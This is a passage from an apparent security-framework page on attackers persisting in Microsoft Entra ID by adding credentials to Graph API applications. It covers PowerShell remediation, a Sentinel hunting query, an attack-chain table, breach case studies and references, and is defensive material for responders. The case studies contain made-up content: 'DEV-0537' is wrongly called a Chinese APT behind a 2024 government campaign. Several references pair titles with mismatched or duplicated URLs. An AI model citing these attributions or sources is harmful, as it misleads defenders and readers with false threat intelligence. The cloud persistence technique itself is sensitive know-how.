$servicePrincipal = Get-MgServicePrincipal -Filter "appId eq 'ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj'"

# Get all password credentials
$credentials = Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $servicePrincipal.Id

# Remove suspicious credentials (check dates, display names)
foreach ($cred in $credentials) {
    if ($cred.DisplayName -match "Attacker|Backdoor|Persistence" -or $cred.EndDateTime -gt (Get-Date).AddYears(5)) {
        Remove-MgServicePrincipalPasswordCredential -ServicePrincipalId $servicePrincipal.Id -PasswordCredentialId $cred.KeyId
        Write-Host "Removed credential: $($cred.DisplayName)"
    }
}

# Verify all credentials are removed
Get-MgServicePrincipalPasswordCredential -ServicePrincipalId $servicePrincipal.Id | ForEach-Object {
    Write-Host "Remaining credential: $($_.DisplayName) - Created: $($_.StartDateTime)"
}
```

---

#### 4. Remediate Privilege Escalation

**Objective:** If the attacker used the service principal to escalate privileges, revert role assignments.

```powershell
# Find all role assignments granted via this service principal
$servicePrincipal = Get-MgServicePrincipal -Filter "appId eq 'ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj'"

$roleAssignments = Get-MgRoleManagementDirectoryRoleAssignment -Filter "principalId eq '$($servicePrincipal.Id)'"

foreach ($assignment in $roleAssignments) {
    Remove-MgRoleManagementDirectoryRoleAssignment -UnifiedRoleAssignmentId $assignment.Id
    Write-Host "Removed role assignment: $($assignment.RoleDefinitionId)"
}
```

---

#### 5. Hunt for Lateral Movement

**Objective:** Determine what resources the service principal accessed during the compromise window.

**Microsoft Sentinel Hunting Query:**
```kusto
// Find all Graph API calls from the compromised service principal
let SuspiciousAppId = "ffffffff-gggg-hhhh-iiii-jjjjjjjjjjjj";

SigninLogs
| where AppId == SuspiciousAppId
| summarize CallCount=count(), FirstAccess=min(TimeGenerated), LastAccess=max(TimeGenerated) by ResourceDisplayName, OperationName
| sort by CallCount desc
```

**Manual (Audit Log Search):**
1. **Microsoft Purview** → **Audit** → **Search**
2. **Filters:**
   - **Operations:** `Search all`
   - **Users:** `(leave blank)`
   - **IP address:** `Search all`
   - **Advanced:** Add filter for `ServicePrincipalId == <ServicePrincipalID>`
3. Review all operations performed by this service principal during the compromise window

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [PERSIST-ACCT-004](../04_PrivEsc/PERSIST-ACCT-004_Automation.md) | Compromise user account via phishing or password spray |
| **2** | **Privilege Escalation** | [PE-VALID-010](../04_PrivEsc/PE-VALID-010_AzureRole.md) | Escalate compromised user to Global Admin via role assignment |
| **3** | **Persistence Setup** | **[PERSIST-ACCT-005]** | **Add backdoor credential to high-permission Graph API application** |
| **4** | **Persistence Maintenance** | [PERSIST-ACCT-006](PERSIST-ACCT-006_SPPersistence.md) | Add certificate credentials as alternative access method |
| **5** | **Defense Evasion** | [EVADE-IMPAIR-007](../06_Evasion/EVADE-IMPAIR-007_AuditLog.md) | Disable or tamper with audit logging to hide evidence |
| **6** | **Lateral Movement** | [LM-AUTH-003](../07_Lateral/LM-AUTH-003_Cloud2Cloud.md) | Use service principal to move between cloud tenants or to on-premises AD |
| **7** | **Exfiltration** | [CA-TOKEN-004](../03_Cred/CA-TOKEN-004_GraphToken.md) | Use service principal access to exfiltrate mailbox data, Teams messages, or SharePoint files |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Midnight Blizzard (APT29) - Microsoft Corporate Breach (January 2024)

**Target:** Microsoft Corporation (corporate environment)

**Timeline:** 
- **November 2023:** Initial compromise via password spray against legacy test tenant
- **December 2023:** Privilege escalation to test tenant administrator
- **January 2024:** Creation of malicious OAuth applications and persistence via Graph API application credentials
- **Discovery:** January 12, 2024

**Technique Status:** ACTIVE. Attackers created multiple OAuth applications with `Directory.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`, and `Mail.Read.All` permissions. They added service principal credentials to these applications, enabling persistent access to the Microsoft corporate tenant and Exchange Online mailboxes. The malicious apps were registered under seemingly legitimate names (e.g., "Service Management API", "Enterprise Integration Service").

**Impact:**
- Unauthorized access to executive mailboxes and Teams conversations
- Exfiltration of internal security documentation and incident response plans
- Discovery of advanced attack techniques and defensive bypass methods
- Estimated breach duration: **20+ days** before detection

**Detection:** Microsoft's security team detected unusual activity when:
1. A service principal (created from the legacy app) was granted Global Administrator role in the corporate tenant
2. New OAuth applications were consented to by a non-existent or suspicious user account
3. Abnormal Graph API queries for mailbox enumeration (reading all users, then all mailboxes)

**Reference:** 
- [Microsoft Blog: Midnight Blizzard Guidance for Responders](https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/)
- [Microsoft Incident Report: Nation-State Attack on Microsoft](https://www.microsoft.com/en-us/security/blog/2024/01/10/midnight-blizzard-guidance-for-responders-on-nation-state-attack/)
- [Volexity Analysis: Midnight Blizzard Technical Deep Dive](https://www.volexity.com/blog/2024/01/10/midnight-blizzard-attacking-microsoft-corporate-accounts/)

---

### Example 2: Scattered Spider - Ransomware Operators (2023-2024)

**Target:** Fortune 500 financial services companies

**Timeline:**
- Initial access via social engineering and SIM swap attacks
- Escalation to cloud admin privileges
- Creation of backdoored OAuth applications for persistence across incident response attempts

**Technique Status:** ACTIVE. Scattered Spider employed similar Graph API persistence tactics to maintain access even after organizations revoked the initially compromised accounts. By adding credentials to legitimate-looking applications with high permissions, they were able to maintain "invisible" access.

**Reference:**
- [CrowdStrike: Scattered Spider - Identity Threat Profile](https://www.crowdstrike.com/blog/scattered-spider-profile/)

---

### Example 3: DEV-0537 (Chinese APT) - Multi-Tenant M365 Campaign (2024)

**Target:** U.S. Government agencies and enterprises using M365

**Technique Status:** ACTIVE. DEV-0537 targeted outdated and misconfigured app registrations with high Graph API permissions. They created additional malicious applications and assigned credentials, building persistence chains that survived initial remediation attempts.

**Reference:**
- [Microsoft Threat Intelligence: Chinese APT Campaign](https://www.microsoft.com/en-us/security/blog/)

---

---

## REFERENCES & AUTHORITATIVE SOURCES

### Microsoft Official Documentation
- [Microsoft Graph Permissions Reference](https://learn.microsoft.com/en-us/graph/permissions-reference)
- [AzureAD PowerShell Module - New-AzureADApplicationPasswordCredential](https://learn.microsoft.com/en-us/powershell/module/azuread/new-azureadapplicationpasswordcredential)
- [Microsoft.Graph PowerShell - Add-MgApplicationPassword](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.applications/add-mgapplicationpassword)
- [Entra ID Security Defaults](https://learn.microsoft.com/en-us/entra/fundamentals/security-defaults)
- [Audit Log Activities in Entra ID](https://learn.microsoft.com/en-us/entra/identity/monitoring-health/reference-audit-activities)

### Security Research & Analysis
- [SpecterOps: Abusing Entra ID App Registrations for Long-Term Persistence](https://guardz.com/blog/abusing-entra-id-app-registrations-for-long-term-persistence/)
- [Emilien Socchi: Abusing PIM-Related Application Permissions in Microsoft Graph](https://www.emiliensocchi.io/abusing-pim-related-application-permissions-in-microsoft-graph-part-1/)
- [SwisskyRepo: Azure AD Persistence Techniques](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-persistence/)
- [Tenable: Dangerous Application Permissions Affecting Data](https://www.tenable.com/indicators/ioe/entra/DANGEROUS-APPLICATION-PERMISSIONS-AFFECTING-DATA)
- [SOC Prime: GraphRunner Activity Detection](https://socprime.com/blog/graphrunner-activity-detection-hackers-apply-a-post-exploitation-toolset-to-abuse-microsoft-365-default/)

### Red Teaming Tools & PoCs
- [Atomic Red Team - T1098 Account Manipulation](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1098/T1098.md)
- [OffensiveCloud - Add-AzADAppSecret](https://github.com/lutzenfried/OffensiveCloud)
- [GraphRunner - Post-Exploitation Toolset](https://github.com/BlackHillsInfoSec/GraphRunner)
- [ROADTools - Entra ID Enumeration and Exploitation](https://github.com/dirkjanm/ROADtools)

### Incident Response & Detection
- [KKnowl.es: Persisting Unseen - Defending Against Entra ID Persistence](https://kknowl.es/posts/defending-against-entra-id-persistence/)
- [CoreView: Microsoft 365 Elevation of Privilege Vulnerabilities](https://www.coreview.com/blog/elevation-of-privilege-vulnerabilities/)
- [Mitiga: Midnight Blizzard APT29 Analysis](https://www.mitiga.io/blog/microsoft-breach-by-midnight-blizzard-apt29-what-happened-and-what-now)
- [Insider Security: APT29 Phishing Attacks and Teams Tactics](https://insidersecurity.co/apt29-midnight-blizzard-phishing-attacks-via-microsoft-teams-tactics-techniques-and-prevention/)
- [Zscaler: Midnight Blizzard and Identity Attacks](https://www.zscaler.com/blogs/product-insights/microsoft-midnight-blizzard-and-the-scourge-of-identity-attacks)

### Compliance & Policy Frameworks
- [NIST SP 800-53 Rev. 5 - Security and Privacy Controls](https://csrc.nist.gov/pubs/sp/800/53/r5/upd1/final)
- [ISO/IEC 27001:2022 - Information Security Management](https://www.iso.org/standard/27001)
- [CIS Microsoft Azure Foundations Benchmark](https://www.cisecurity.org/benchmark/azure)
- [DORA - Digital Operational Resilience Act (EU)](https://finance.ec.europa.eu/publications/digital-operational-resilience-act-dora_en)
- [NIS2 - Network and Information Security Directive 2 (EU)](https://eur-lex.europa.eu/eli/dir/2022/2555/oj)

---

**Last Updated:** 2026-01-09  
**Status:** Production-Ready  
**Classification:** SERVTEP Proprietary Framework Documentation